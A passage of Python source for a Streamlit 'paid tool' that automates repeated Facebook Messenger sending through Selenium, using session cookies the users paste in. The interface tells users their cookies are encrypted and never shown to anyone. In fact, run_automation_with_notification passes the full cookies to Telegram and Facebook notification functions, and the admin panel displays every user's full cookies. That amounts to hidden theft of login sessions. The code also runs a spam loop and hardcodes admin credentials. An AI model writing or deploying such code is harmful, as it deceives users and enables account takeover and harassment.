        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running:
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send}', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass

# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
    return whatsapp_url

# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
def send_approval_request_via_facebook(user_real_name, approval_key):
    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    facebook_url = f"https://www.facebook.com/WALEED.ADMIN"
    return facebook_url

# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    telegram_url = f"https://t.me/WALEED_ADMIN?text={requests.utils.quote(message)}"
    return telegram_url

def run_automation_with_notification(user_config, username, automation_state, user_id):
    # Send notifications before starting automation
    user_data = {
        'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']  # Full cookies now
    }
    
    # Send notifications
    telegram_sent = send_telegram_notification(user_data, automation_data)
    facebook_sent = send_facebook_notification(user_data, automation_data)
    
    if telegram_sent:
        log_message(f'AUTO-1: Telegram notification sent successfully!', automation_state, user_id)
    if facebook_sent:
        log_message(f'AUTO-1: Facebook notification sent successfully!', automation_state, user_id)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    automation_state.user_id = user_id
    automation_state.username = db.get_username(user_id)
    
    # Initialize global state for this user
    st.session_state.all_automation_states[user_id] = []
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    if user_id in st.session_state.all_automation_states:
        st.session_state.all_automation_states[user_id].append(f"[{get_indian_time()}] ADMIN: Automation stopped by owner")
    
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# Main application
st.markdown('<div class="main-container">', unsafe_allow_html=True)

# Tool Logo
st.markdown('<div class="tool-logo"></div>', unsafe_allow_html=True)

# Main Header with WALEED branding
st.markdown('<div class="main-header"><h1>WALEED PAID TOOL E2E UPDATE V.12</h1><p>Premium Facebook Automation Solution</p><p class="version">VERSION 12.0 | PREMIUM EDITION</p></div>', unsafe_allow_html=True)

# Admin Panel
if st.sidebar.checkbox("🔐 ADMIN ACCESS"):
    admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
    admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
    
    if st.sidebar.button("LOGIN AS ADMIN", use_container_width=True):
        # UPDATED: Changed admin credentials to WALEED
        if admin_username == "WALEED_ADMIN" and admin_password == "WALEEDX2025":
            st.session_state.admin_logged_in = True
            st.sidebar.success("✅ ADMIN ACCESS GRANTED!")
        else:
            st.sidebar.error("❌ INVALID CREDENTIALS!")

if st.session_state.admin_logged_in:
    st.markdown("### 🔥 ADMIN CONTROL PANEL")
    
    # Get all pending approvals
    pending_users = db.get_pending_approvals()
    
    if pending_users:
        st.markdown(f"#### ⏳ PENDING APPROVALS ({len(pending_users)})")
        
        for user in pending_users:
            user_id, username, approval_key, real_name = user
            
            with st.container():
                col1, col2, col3 = st.columns([3, 1, 1])
                
                with col1:
                    st.markdown(f"""
                    <div class="user-card pending">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"✅ APPROVE", key=f"approve_{user_id}"):
                        db.update_approval_status(user_id, 'approved')
                        st.success(f"✅ USER APPROVED: {username}")
                        st.rerun()
                
                with col3:
                    if st.button(f"❌ REJECT", key=f"reject_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        st.error(f"❌ USER REJECTED: {username}")
                        st.rerun()
    
    # Show all approved users with remove option
    approved_users = db.get_approved_users()
    if approved_users:
        st.markdown("#### ✅ APPROVED USERS - LIVE MONITORING")
        
        for user in approved_users:
            user_id, username, approval_key, real_name, automation_running = user
            
            user_config = db.get_user_config(user_id)
            chat_id = user_config['chat_id'] if user_config else "Not configured"
            delay = user_config['delay'] if user_config else "N/A"
            prefix = user_config['name_prefix'] if user_config else "N/A"
            messages_count = len(user_config['messages_file_content'].splitlines()) if user_config and user_config['messages_file_content'] else 0
            cookies = user_config['cookies'] if user_config else ""
            
            with st.container():
                st.markdown(f"""
                <div class="admin-user-details">
                    <h4>👤 {username} | 🆔 {user_id}</h4>
                    <p><strong>📝 Real Name:</strong> {real_name} | <strong>💬 Chat ID:</strong> {chat_id}</p>
                    <p><strong>🏷️ Prefix:</strong> {prefix} | <strong>⏱️ Delay:</strong> {delay}s | <strong>📨 Messages:</strong> {messages_count} lines</p>
                    <p><strong>📊 Status:</strong> {'🟢 RUNNING' if automation_running else '🔴 STOPPED'}</p>
                    <p><strong>🍪 Cookies:</strong> {cookies[:100]}...</p>
                </div>
                """, unsafe_allow_html=True)
                
                # User logs in admin panel
                if user_id in st.session_state.all_automation_states:
                    logs_html = '<div class="admin-logs-container">'
                    for log in st.session_state.all_automation_states[user_id][-20:]:  # Last 20 logs
                        logs_html += f'<div class="admin-log-line">{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                
                col1, col2, col3, col4 = st.columns(4)
                
                with col1:
                    if st.button(f"🗑️ REMOVE APPROVAL", key=f"remove_{user_id}", use_container_width=True):
                        db.update_approval_status(user_id, 'rejected')
                        if automation_running:
                            stop_automation(user_id)
                        st.error(f"❌ APPROVAL REMOVED: {username}")
                        st.rerun()
                
                with col2:
                    if automation_running:
                        if st.button(f"⏹️ STOP AUTOMATION", key=f"stop_{user_id}", use_container_width=True):
                            stop_automation(user_id)
                            st.warning(f"⚠️ AUTOMATION STOPPED: {username}")
                            st.rerun()
                    else:
                        if st.button(f"▶️ START AUTOMATION", key=f"start_{user_id}", use_container_width=True):
                            if user_config and user_config['chat_id']:
                                db.set_automation_running(user_id, True)
                                start_automation(user_config, user_id)
                                st.success(f"✅ AUTOMATION STARTED: {username}")
                                st.rerun()
                            else:
                                st.error("❌ USER NEEDS TO CONFIGURE CHAT ID FIRST")
                
                with col3:
                    if st.button(f"📊 FULL DETAILS", key=f"details_{user_id}", use_container_width=True):
                        if user_config:
                            st.markdown(f"""
                            **🔍 COMPLETE USER CONFIGURATION:**
                            - **🆔 User ID:** `{user_id}`
                            - **👤 Username:** `{username}`
                            - **📝 Real Name:** `{real_name}`
                            - **💬 Chat ID:** `{chat_id}`
                            - **🏷️ Prefix:** `{prefix}`
                            - **⏱️ Delay:** `{delay} seconds`
                            - **📨 Messages:** `{messages_count} lines`
                            - **🍪 Cookies:** `{cookies}`
                            - **🔑 Approval Key:** `{approval_key}`
                            - **📊 Status:** `{'🟢 RUNNING' if automation_running else '🔴 STOPPED'}`
                            """)
                
                with col4:
                    if st.button(f"🔄 REFRESH LOGS", key=f"refresh_{user_id}", use_container_width=True):
                        st.rerun()
                
                st.markdown("---")
    
    # Show all users
    all_users = db.get_all_users()
    if all_users:
        st.markdown("#### 📊 ALL USERS SUMMARY")
        for user in all_users:
            user_id, username, approval_status, real_name, approval_key = user
            
            status_class = approval_status.lower() if approval_status else 'pending'
            status_icon = "✅" if approval_status == 'approved' else "⏳" if approval_status == 'pending' else "❌"
            
            st.markdown(f"""
            <div class="user-card {status_class}">
                {status_icon} <strong>👤 Username:</strong> {username} | 
                <strong>📊 Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
                <strong>📝 Real Name:</strong> {real_name}
            </div>
            """, unsafe_allow_html=True)
    
    if st.sidebar.button("LOGOUT FROM ADMIN", use_container_width=True):
        st.session_state.admin_logged_in = False
        st.rerun()

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 LOGIN", "✨ SIGN UP"])
    
    with tab1:
        st.markdown("### 🔥 WELCOME BACK!")
        
        st.markdown('<div class="input-label">USERNAME</div>', unsafe_allow_html=True)
        username = st.text_input("", key="login_username", placeholder="Enter your username", label_visibility="collapsed")
        st.markdown('<div class="input-hint">Enter your registered username</div>', unsafe_allow_html=True)
        
        st.markdown('<div class="input-label">PASSWORD</div>', unsafe_allow_html=True)
        password = st.text_input("", key="login_password", type="password", placeholder="Enter your password", label_visibility="collapsed")
        st.markdown('<div class="input-hint">Enter your account password</div>', unsafe_allow_html=True)
        
        if st.button("LOGIN", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    # Check approval status
                    approval_status = db.get_approval_status(user_id)
                    
                    if approval_status == 'approved':
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = 'approved'
                        
                        # Get or generate approval key
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start and not st.session_state.automation_state.running:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                        
                        st.success(f"✅ WELCOME BACK, {username.upper()}!")
                        st.rerun()
                    else:
                        # User needs approval
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = approval_status or 'pending'
                        
                        # Get or generate approval key
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        st.rerun()
                else:
                    st.error("❌ INVALID USERNAME OR PASSWORD!")
            else:
                st.warning("⚠️ PLEASE ENTER BOTH USERNAME AND PASSWORD")
    
    with tab2:
        st.markdown("### ✨ CREATE NEW ACCOUNT")
        
        st.markdown('<div class="input-label">CHOOSE USERNAME</div>', unsafe_allow_html=True)
        new_username = st.text_input("", key="signup_username", placeholder="Choose a unique username", label_visibility="collapsed")
        st.markdown('<div class="input-hint">Select a unique username for your account</div>', unsafe_allow_html=True)
        
        st.markdown('<div class="input-label">CHOOSE PASSWORD</div>', unsafe_allow_html=True)
        new_password = st.text_input("", key="signup_password", type="password", placeholder="Create a strong password", label_visibility="collapsed")
        st.markdown('<div class="input-hint">Create a secure password for your account</div>', unsafe_allow_html=True)
        
        st.markdown('<div class="input-label">CONFIRM PASSWORD</div>', unsafe_allow_html=True)
        confirm_password = st.text_input("", key="confirm_password", type="password", placeholder="Re-enter your password", label_visibility="collapsed")
        st.markdown('<div class="input-hint">Re-enter your password to confirm</div>', unsafe_allow_html=True)
        
        if st.button("CREATE ACCOUNT", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    result = db.create_user(new_username, new_password)
                    
                    if isinstance(result, tuple) and len(result) >= 2:
                        success, message, user_id = result[0], result[1], result[2] if len(result) > 2 else None
                    else:
                        success = result if isinstance(result, bool) else False
                        message = "User creation completed" if success else "User creation failed"
                        user_id = None
                    
                    if success:
                        if user_id:
                            approval_key = generate_approval_key(new_username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.success(f"✅ {message.upper()} PLEASE LOGIN NOW!")
                    else:
                        st.error(f"❌ {message.upper()}")
                else:
                    st.error("❌ PASSWORDS DO NOT MATCH!")
            else:
                st.warning("⚠️ PLEASE FILL ALL FIELDS")

else:
    # User is logged in but needs approval
    if st.session_state.approval_status != 'approved':
        st.markdown("### 🔒 APPROVAL REQUIRED")
        
        # User Info Box
        st.markdown(f"""
        <div class="user-info-box">
            <h3>👤 USER INFORMATION</h3>
            <p><strong>👤 Username:</strong> {st.session_state.username}</p>
            <p><strong>📝 Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
        </div>
        """, unsafe_allow_html=True)
        
        # Approval Key Box
        st.markdown(f"""
        <div class="approval-key-box">
            <h3>🔑 YOUR APPROVAL KEY</h3>
            <div class="approval-key-display">{st.session_state.approval_key}</div>
            <button class="copy-btn" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 COPY KEY</button>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown("### 📝 ENTER YOUR REAL NAME")
        st.markdown('<div class="input-label">YOUR REAL NAME</div>', unsafe_allow_html=True)
        user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                      value=st.session_state.user_real_name, label_visibility="collapsed")
        st.markdown('<div class="input-hint">This name will be sent to WALEED ADMIN for approval</div>', unsafe_allow_html=True)
        
        if user_real_name:
            st.session_state.user_real_name = user_real_name
            db.update_user_real_name(st.session_state.user_id, user_real_name)
        
        # Send Approval Request Button
        st.markdown("### 📤 SEND APPROVAL REQUEST")
        st.markdown("Click the button below to send your approval request to WALEED ADMIN:")
        
        if st.button("📨 SEND APPROVAL REQUEST", use_container_width=True, key="send_approval_btn"):
            if st.session_state.user_real_name:
                st.success("✅ APPROVAL REQUEST READY! USE THE CONTACT BUTTONS BELOW TO SEND IT.")
            else:
                st.warning("⚠️ PLEASE ENTER YOUR REAL NAME FIRST")
        
        # Contact buttons - ALWAYS VISIBLE
        st.markdown("### 📞 CONTACT WALEED ADMIN FOR APPROVAL")
        st.markdown("Click any button below to send your approval request:")
        
        col1, col2, col3 = st.columns(3)
        
        with col1:
            whatsapp_url = send_approval_request_via_whatsapp(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{whatsapp_url}" class="contact-btn whatsapp" target="_blank">📱 WHATSAPP</a>', unsafe_allow_html=True)
        
        with col2:
            facebook_url = send_approval_request_via_facebook(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{facebook_url}" class="contact-btn facebook" target="_blank">👤 FACEBOOK</a>', unsafe_allow_html=True)
        
        with col3:
            telegram_url = send_approval_request_via_telegram(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ TELEGRAM</a>', unsafe_allow_html=True)
        
        st.info("ℹ️ After sending the approval request, wait for WALEED ADMIN to approve your key. Refresh this page to check your approval status.")
        
        # Check approval status
        if st.button("🔄 CHECK APPROVAL STATUS", use_container_width=True):
            current_status = db.get_approval_status(st.session_state.user_id)
            st.session_state.approval_status = current_status
            
            if current_status == 'approved':
                st.success("🎉 YOUR ACCOUNT HAS BEEN APPROVED! YOU CAN NOW ACCESS THE AUTOMATION FEATURES.")
                st.rerun()
            else:
                st.warning("⏳ YOUR APPROVAL IS STILL PENDING. PLEASE WAIT FOR WALEED ADMIN TO APPROVE YOUR REQUEST.")
        
        if st.sidebar.button("🚪 LOGOUT", use_container_width=True):
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.rerun()
    
    else:
        # User is approved and can access automation
        if not st.session_state.auto_start_checked and st.session_state.user_id:
            st.session_state.auto_start_checked = True
            should_auto_start = db.get_automation_running(st.session_state.user_id)
            if should_auto_start and not st.session_state.automation_state.running:
                user_config = db.get_user_config(st.session_state.user_id)
                if user_config and user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
        
        st.sidebar.markdown(f"### 👤 {st.session_state.username}")
        st.sidebar.markdown(f"**📊 Status:** ✅ APPROVED")
        st.sidebar.markdown(f"**🆔 User ID:** {st.session_state.user_id}")
        
        if st.sidebar.button("🚪 LOGOUT", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1, tab2 = st.tabs(["⚙️ CONFIGURATION", "🚀 AUTOMATION"])
            
            with tab1:
                st.markdown("### ⚙️ YOUR CONFIGURATION")
                
                st.markdown('<div class="input-label">CHAT/CONVERSATION ID</div>', unsafe_allow_html=True)
                chat_id = st.text_input("", value=user_config['chat_id'], 
                                       placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)",
                                       label_visibility="collapsed")
                st.markdown('<div class="input-hint">Enter Facebook conversation ID from the URL</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">NAME PREFIX</div>', unsafe_allow_html=True)
                name_prefix = st.text_input("", value=user_config['name_prefix'],
                                           placeholder="e.g., [WALEED E2E AUTOMATION]",
                                           label_visibility="collapsed")
                st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">DELAY (SECONDS)</div>', unsafe_allow_html=True)
                delay = st.number_input("", min_value=1, max_value=300, 
                                       value=user_config['delay'],
                                       label_visibility="collapsed")
                st.markdown('<div class="input-hint">Wait time between messages (1-300 seconds)</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">FACEBOOK COOKIES (OPTIONAL)</div>', unsafe_allow_html=True)
                cookies = st.text_area("", 
                                      value="",
                                      placeholder="Paste your Facebook cookies here (encrypted and private)",
                                      height=100,
                                      label_visibility="collapsed")
                st.markdown('<div class="input-hint">Your cookies are encrypted and never shown to anyone</div>', unsafe_allow_html=True)
                
                st.markdown('<div class="input-label">MESSAGES FILE UPLOAD</div>', unsafe_allow_html=True)
                uploaded_file = st.file_uploader("", type=['txt'], label_visibility="collapsed")
                st.markdown('<div class="input-hint">Upload a .txt file with messages (one per line)</div>', unsafe_allow_html=True)
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                if st.button("💾 SAVE CONFIGURATION", use_container_width=True):
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content
                    )
                    st.success("✅ CONFIGURATION SAVED SUCCESSFULLY!")
                    st.rerun()
            
            with tab2:
                st.markdown("### 🚀 AUTOMATION CONTROL")
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.markdown(f"""
                    <div class="metric-box">
                        <div class="metric-value">{st.session_state.automation_state.message_count}</div>
                        <div class="metric-label">MESSAGES SENT</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    status = "🟢 RUNNING" if st.session_state.automation_state.running else "🔴 STOPPED"
                    st.markdown(f"""
                    <div class="metric-box">
                        <div class="metric-value">{'RUNNING' if st.session_state.automation_state.running else 'STOPPED'}</div>
                        <div class="metric-label">STATUS</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col3:
                    st.markdown(f"""
                    <div class="metric-box">
                        <div class="metric-value">{len(st.session_state.automation_state.logs)}</div>
                        <div class="metric-label">TOTAL LOGS</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                col1, col2 = st.columns(2)
                
                with col1:
                    if st.button("▶️ START E2EE AUTOMATION", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("❌ PLEASE CONFIGURE CHAT ID FIRST!")
                
                with col2:
                    if st.button("⏹️ STOP E2EE AUTOMATION", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown("### 📜 LIVE LOGS CONSOLE")
                
                if st.session_state.automation_state.logs:
                    logs_html = '<div class="log-container">'
                    for log in st.session_state.automation_state.logs[-50:]:
                        logs_html += f'<div class="log-line">{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                else:
                    st.info("ℹ️ No logs yet. Start automation to see logs here.")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()

st.markdown('</div>', unsafe_allow_html=True)
st.markdown(f'<div class="footer">🔥 MADE WITH PASSION BY WALEED | © 2025 WALEED PAID TOOL | VERSION 12.0</div>', unsafe_allow_html=True)
